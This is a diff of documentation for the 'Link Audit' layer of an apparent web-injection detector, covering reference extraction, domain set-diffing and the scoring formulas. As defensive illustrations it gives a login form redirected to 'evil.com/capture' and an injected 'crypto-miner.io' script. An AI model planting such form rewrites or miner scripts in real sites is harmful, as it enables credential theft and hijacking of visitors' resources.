@@ -1,62 +1,91 @@
 ---
 title: "Layer 3: Link Audit"
-description: "Identifies hijacked traffic and unauthorized external resources."
+description: "Identifies hijacked traffic and unauthorized external resources by diffing reference sets."
 icon: "link"
 ---
 
-The **Link Audit Layer** parses all network references embedded in the HTML tree. Attackers often alter links to siphon traffic to phishing domains or inject unauthorized tracking pixels.
+The **Link Audit Layer** diffs the *sets* of external references embedded in the page. Attackers redirect form submissions to phishing endpoints, inject third-party `<script>` sources, or add unauthorized tracking. A brand-new external domain appearing on a page is one of the strongest injection signals, and this layer isolates it statically without executing anything.
 
+<Info>
+  Source: `backend/worker/detection/dom.py` (`layer3_link_audit`, `_collect_refs`, `_norm_ref`, `_domains`). Input: the suppression-filtered HTML of both sides.
+</Info>
 
-## Deep Dive Mechanism
+## References collected
+
+The layer extracts five reference kinds. Note that `<img src>` is **not** among them — image sources are a high-noise, low-signal channel and are covered visually by [Layer 4](/layers/4-visual-diff).
+
+| Reference kind | Source | Weight |
+| :--- | :--- | :---: |
+| `script_src` | `<script src>` | 1.0 |
+| `iframe_src` | `<iframe src>` | 1.0 |
+| `form_action` | `<form action>` | 1.0 |
+| `link_href` | `<link href>` (stylesheets, fonts) | 0.6 |
+| `a_href` | `<a href>` (hyperlinks) | 0.35 |
+
+A new external domain in a `<script>`, `<iframe>`, or `<form action>` is treated as critical; the same domain appearing only in an `<a href>` is weighted lowest.
+
+## Deep dive mechanism
 
 ```mermaid
-graph LR
-    HTML[Suppression-Filtered HTML] --> PARSER[Network Reference Parser]
-    PARSER --> EXTRACT[Extract 'href', 'src', 'action']
-    EXTRACT --> NORMALIZE[Normalize to FQDNs]
-    NORMALIZE --> SET_DIFF{Set Difference}
-    
-    SET_DIFF --> |New Domains Found| SCORE_HIGH[Spike Risk Score]
-    SET_DIFF --> |Only Trusted Domains| SCORE_LOW[Keep Score Zero]
-```
+flowchart LR
+    HTML[Suppressed HTML] --> EX[Collect 5 reference kinds]
+    EX --> NM[Normalize · resolve · drop js:/data:/mailto:]
+    NM --> DM[Extract hostnames]
+    DM --> SD{Set difference vs baseline}
+    SD --> ND[New external domains × weight]
+    SD --> CH[Same-domain churn]
+    ND --> SC[domain_score]
+    CH --> CS[churn_score]
+    SC --> MX[max]
+    CS --> MX
+    MX --> OUT[Layer 3 score · 0.0–1.0]
 
-This layer extracts and compares specific HTML attributes that dictate network behavior. It does not execute the links; it statically analyzes the intent of the HTML references.
+    classDef out fill:#1b5e20,stroke:#2e7d32,color:#fff;
+    class OUT out;
+```
 
 <Steps>
   <Step title="Extraction">
-    The layer searches the DOM for specific tags that initiate network requests:
-    - `<a href="...">`: Hyperlinks pointing outward.
-    - `<link href="...">`: External stylesheets and fonts.
-    - `<script src="...">`: External JavaScript files.
-    - `<form action="...">`: Data submission endpoints.
-    - `<img src="...">`: Image sources.
+    lxml walks the tree and collects `src`/`href`/`action` for the five tag kinds into sets.
   </Step>
   <Step title="Normalization">
-    Relative URLs (like `/api/login`) are normalized against the site's base URL. The parser extracts the Fully-Qualified Domain Name (FQDN) for every link on the page (e.g., `https://evil.com/capture` becomes `evil.com`).
+    Each reference is resolved against the page's `final_url` with `urljoin`, then normalized. References that are not comparable links are dropped: fragments (`#...`), and `javascript:`, `data:`, `mailto:`, `tel:`, `about:` schemes. Only `http`, `https`, and scheme-relative refs survive. Fragments are stripped from the tail; **query strings are kept** (defacers love appending `?redirect=`).
   </Step>
-  <Step title="Set Difference Evaluation">
-    The engine constructs a Python `set()` of the baseline's known domains and a `set()` of the current scan's domains. It then subtracts the baseline set from the current set (`current_domains - baseline_domains`).
+  <Step title="Known-domain set">
+    The baseline's domains across all reference kinds, plus the page's own host, form the `known_domains` set. Any added reference whose hostname is not in that set is a *new external domain*.
   </Step>
   <Step title="Scoring">
-    The introduction of *entirely new domains* drastically spikes the risk score. The score scales dynamically based on the tag type. A new domain in a `<script>` or `<form>` tag is considered critically dangerous (immediate 1.0 contribution), whereas a new domain in an `<a>` tag (a hyperlink) is treated as suspicious but potentially benign.
+    New external domains are weighted by kind and saturated; same-domain churn is scored separately and far more gently. The layer returns the larger of the two.
   </Step>
 </Steps>
 
-## Traffic Hijacking Examples
+### Scoring formulas
+
+```python
+# weighted count of new external domains, per reference kind
+domain_score = 1 - math.exp(-0.9 * new_domains_weighted)   # saturating
+# every added ref (even same-domain) matters a little, capped at 0.4
+churn_score  = min(0.4, 0.02 * total_new_refs)
+score        = max(domain_score, churn_score)
+```
+
+One new script/iframe/form domain (weight 1.0) yields `domain_score ≈ 0.59`; two yield ≈ 0.83. Same-domain reorganization can never exceed `0.4` from this layer.
+
+## Traffic-hijacking examples
 
 <CardGroup cols={2}>
-  <Card title="Credential Harvesting" icon="mask">
-    An attacker modifies `<form action="/login">` to point to `https://evil.com/capture`. Layer 3 instantly identifies `evil.com` as an unauthorized FQDN in a form action and flags the scan.
+  <Card title="Credential harvesting" icon="mask">
+    An attacker rewrites `<form action="/login">` to `https://evil.com/capture`. `evil.com` is a new domain in a `form_action` (weight 1.0) and spikes the score immediately.
   </Card>
-  <Card title="Malvertising" icon="rectangle-ad">
-    An attacker injects `<script src="https://crypto-miner.io/miner.js">`. Even if the script tag itself is obfuscated, the FQDN extraction isolates `crypto-miner.io` and raises an alarm.
+  <Card title="Malvertising / cryptomining" icon="rectangle-ad">
+    An injected `<script src="https://crypto-miner.io/miner.js">` surfaces `crypto-miner.io` as a new `script_src` domain regardless of obfuscation inside the file.
   </Card>
 </CardGroup>
 
-## False Positive Suppression
+## False-positive suppression
 
-Just like Layer 2, Layer 3 receives the **Suppression-Filtered** copy of the HTML. If an operator applies a CSS selector suppression rule to a dynamic sidebar widget that loads external tracking pixels, those links are stripped from the DOM before Layer 3 executes.
+Layer 3 receives the suppression-filtered HTML. CSS-selector rules applied to a dynamic widget that loads external pixels strip those references from the DOM on both sides before extraction.
 
 <Info>
-  **Internal Restructuring**: Removing links or changing URLs while staying within previously trusted domains results in a `0.0` score from this layer. Changing an image from `cdn.yoursite.com/img1.png` to `cdn.yoursite.com/img2.png` is ignored, preventing false positives during legitimate content updates.
+  **Internal restructuring is free.** Moving links, renaming paths, or swapping assets within already-trusted domains scores `0.0` from the domain term. Changing `cdn.yoursite.com/img1.png` to `cdn.yoursite.com/img2.png` introduces no new domain; only a small `churn_score` (capped at 0.4) can register, and only if the total number of added references is large.
 </Info>
